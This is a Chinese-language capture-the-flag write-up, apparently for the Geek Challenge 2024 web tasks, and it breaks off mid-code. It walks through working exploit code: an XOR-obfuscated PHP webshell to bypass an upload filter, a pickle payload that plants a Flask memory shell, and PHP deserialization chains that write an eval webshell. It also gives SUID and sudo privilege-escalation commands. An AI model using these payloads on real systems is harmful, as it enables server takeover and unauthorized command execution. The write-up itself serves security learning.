<p>账号密码为admin/SYC@chengxing<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-223206303.png" class=""><br>后台发现一个文件上传<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-223408562.png" class=""><br>其存在waf，我这里直接使用无字母数字webshell来绕过<a href="https://lisien11.xyz/2024/03/18/NSSCTF%E5%88%B7%E9%A2%981(%E5%86%85%E6%9C%89%E6%97%A0%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97RCE">无字母数字webshell</a>/?highlight=%E6%97%A0%E5%AD%97%E6%AF%8D)<br>异或绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="meta">&lt;?php</span> %<span class="number">24</span>_%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>!((%<span class="number">25</span>)(%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">40</span>%<span class="number">5</span>B%<span class="number">5</span>B%<span class="number">40</span>%<span class="number">5</span>B%<span class="number">5</span>C%<span class="number">5</span>C%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>!%<span class="number">2</span>B%<span class="number">2</span>F((%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>~%<span class="number">7</span>B%<span class="number">60</span>%<span class="number">7</span>B%<span class="number">7</span>C%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>_(%<span class="number">24</span>___%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B <span class="meta">?&gt;</span>&amp;save=%E4%BF%<span class="number">9</span>D%E5%AD%<span class="number">98</span></span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-224459826.png" class="">  </p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-224447694.png" class="">  
<h2 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h2><p>产生了很多上传方法发现都不行,猜测有可能是中间件的解析漏洞<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-230234912.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-230216773.png" class=""><br>其存在换行符解析漏洞<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/leixiao-/p/10223090.html">Apache HTTPD 换行解析漏洞（CVE-2017-15715）
</a><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-231025631.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-231050095.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-231140261.png" class="">  </p>
<h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><p>注册登陆后可以得到源码</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, make_response, render_template, send_file</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> black</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#To Ctfer：给你源码只是给你漏洞点的hint，怎么绕？black.py黑盒，唉无意义</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(<span class="string">&#x27;templates/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        usname = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        passwd = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> usname <span class="keyword">and</span> passwd:</span><br><span class="line">            heart_cookie = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">            response = make_response(<span class="string">f&quot;Registered successfully with username: <span class="subst">&#123;usname&#125;</span> &lt;br&gt; Now you can go to /login to heal starven&#x27;s heart&quot;</span>)</span><br><span class="line">            response.set_cookie(<span class="string">&#x27;heart&#x27;</span>, heart_cookie)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>  render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    heart_cookie = request.cookies.get(<span class="string">&#x27;heart&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> heart_cookie:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;warning.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.cookies.get(<span class="string">&#x27;heart&#x27;</span>) == heart_cookie:</span><br><span class="line">        statement = request.form[<span class="string">&#x27;statement&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            heal_state = base64.b64decode(statement)</span><br><span class="line">            <span class="built_in">print</span>(heal_state)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> black.blacklist:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> heal_state:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;waf.html&#x27;</span>)</span><br><span class="line">            pickle.loads(heal_state)</span><br><span class="line">            res = make_response(<span class="string">f&quot;Congratulations! You accomplished the first step of healing Starven&#x27;s broken heart!&quot;</span>)</span><br><span class="line">            flag = os.getenv(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">or</span> os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">            os.system(<span class="string">&quot;echo &quot;</span> + flag + <span class="string">&quot; &gt; /flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>( e)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error!!!! give you hint: maybe you can view /starven_s3cret&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/monologue&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">joker</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;joker.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/starven_s3cret&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>可以发现只要登陆后就可以pickle反序列化，好像得绕waf，不管他先试一下内存马<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;lse&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-225435984.png" class=""><br>过了?<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-225524912.png" class="">  </p>
<p>薛定谔的waf<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241111-100027773.png" class="">  </p>
<h2 id="not-just-pop"><a href="#not-just-pop" class="headerlink" title="not_just_pop"></a>not_just_pop</h2><p>首先是php反序列，主要考点就是GC回收机制，利用数组的方式来触发， 链子我就不多说了如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lhRaMK7&#123;__destruct&#125;-&gt;Parar&#123;__set&#125;-&gt;Starven&#123;__toString&#125;-&gt;Parar&#123;__get&#125;-&gt;SYC-&gt;&#123;__isset&#125;-&gt;Starven&#123;__call&#125;-&gt;lhRaMK7&#123;invoke&#125;</span><br></pre></td></tr></table></figure>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-010421210.png" class="">  
<p>代码会抛出异常所以我们要使用GC回收机制来提前触发反序列化<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lhRaMK7</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Do</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$You</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>=<span class="string">&quot;eval(\$_POST[123]);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parar</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$execurise</span>=<span class="string">&quot;man!&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lead</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hansome</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Starven</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$friend</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYC</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$forever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;forever-&gt;<span class="title function_ invoke__">nononon</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You=<span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You-&gt;lead=<span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You-&gt;lead-&gt;girl=<span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome=<span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever=<span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever-&gt;friend=<span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&quot;0&quot;</span>=&gt;<span class="variable">$a</span>,<span class="string">&quot;1&quot;</span>=&gt;<span class="literal">null</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><br>将输出的值中的后面的1改为0，再url解码。然后再base64编码<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-010843675.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-011013718.png" class=""><br>存在disable_functions用蚁剑来绕<br>直接蚁剑连<br>使用PHP7 Backtrace UAF成功绕过<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241110-215002369.png" class=""><br>然后就是sudo提权了<br>sudo -l<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-011450076.png" class=""><br>会发现有env。我们可以使用env来sudo提权<br>sudo env /bin/bash -c “cat /flag”<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241110-221405582.png" class="">  </p>
<h2 id="php不比java差"><a href="#php不比java差" class="headerlink" title="php不比java差"></a>php不比java差</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-193533066.png" class="">  
<p>我们看一下会找到一个入口点方法<code>__unserialize</code>，这个魔术方法是8.1版本出的,起在反序列时触发，且如果于wakeup同时存在时，只触发<code>__unserialize</code>起参数$data其实就是存储了该类所有属性的数组<br>而最终的命令执行点其实就是下面的反射调用来进行命令执行<br><a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">任意代码执行下的php原生类利用</a></p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-160339097.png" class="">  
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-193326963.png" class="">  
<p>即我们只要将IS赋值为system,where赋值为ReflectionFunction。Starven赋值为invoke。最后就可以命令执行Girlfriend的内容了</p>
<p>链子很短我们只要将change赋值为implode，Geek其中一个属性赋值为Syclover。这样就会导致$data内的Syclover于另一个属性拼接从而触发toString。然后反射调用命令执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sink</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is there any file?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geek</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$change</span>=<span class="string">&quot;implode&quot;</span>;</span><br><span class="line">        <span class="variable">$FUNC</span>=<span class="variable">$change</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$FUNC</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Syclover</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Where</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Starven</span>=<span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Girlfriend</span>=<span class="keyword">array</span>(<span class="string">&quot;http://111.230.38.159:8000/evil.xml&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$eee</span>=<span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Where</span>(<span class="variable">$this</span>-&gt;IS);</span><br><span class="line">        <span class="variable">$fff</span>=<span class="variable language_">$this</span>-&gt;Starven;</span><br><span class="line">        <span class="variable">$eee</span>-&gt;<span class="variable">$fff</span>(<span class="variable language_">$this</span>-&gt;Girlfriend);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;111&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="keyword">new</span> <span class="title class_">Syclover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;Where=<span class="string">&quot;ReflectionFunction&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;IS=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;Girlfriend=<span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[123]);phpinfo();?&gt;&#x27; &gt; /var/www/html/shell.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="comment">#unserialize($b);</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Geek&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;Syclover&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Where&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;ReflectionFunction&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;IS&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Starven&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;invoke&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Girlfriend&quot;</span>;s:<span class="number">69</span>:<span class="string">&quot;echo &#x27;&lt;?php eval(<span class="subst">$_POST</span>[123]);phpinfo();?&gt;&#x27; &gt; /var/www/html/shell.php&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p>输入<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br>可以发现其存在suid权限的有file那么我们就可以用这个来读取文件<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-160320606.png" class="">  </p>
<h2 id="py-game"><a href="#py-game" class="headerlink" title="py_game"></a>py_game</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-233248488.png" class="">  
<p>骗子假的<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-234015050.png" class=""><br>还是得session伪造<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-234355039.png" class=""><br>得到其key为a123456我们将username改为admin<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-234640484.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-234724031.png" class="">  </p>
<p>接下来访问admin<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-234755579.png" class=""><br>可以下载pyc<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-235444172.png" class=""><br>反编译得到源码<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 